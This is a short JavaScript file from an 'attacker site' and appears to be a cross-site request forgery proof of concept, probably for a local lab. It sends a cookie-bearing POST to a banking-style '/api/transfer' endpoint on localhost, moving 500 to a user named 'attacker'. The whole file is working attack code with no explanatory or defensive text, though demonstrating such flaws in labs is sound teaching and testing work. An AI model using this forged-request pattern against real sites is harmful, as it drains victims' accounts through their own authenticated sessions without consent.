console.log("This is the attacker site");

//fetch("http://localhost:8000")

fetch(
    "http://localhost:8000/api/transfer",
    {
        method: "POST",
        // CORS mode
        mode: "no-cors",
        // Must be set to "include" or "same-origin" to send OR receive cookies
        credentials: "include",
        headers: {
            'Content-Type': 'application/json' // TODO: Change for exploit
        },
        // body: {
        //     to_user: "attacker",
        //     amount: 500
        // }
        body: JSON.stringify({
            to_user: "attacker",
            amount: 500
        })
    }
).then(
    response => {
        console.log(response);
        //return response.json()
    }
)
// ).then(
//     data => {
//         console.log(data);
//     }
// )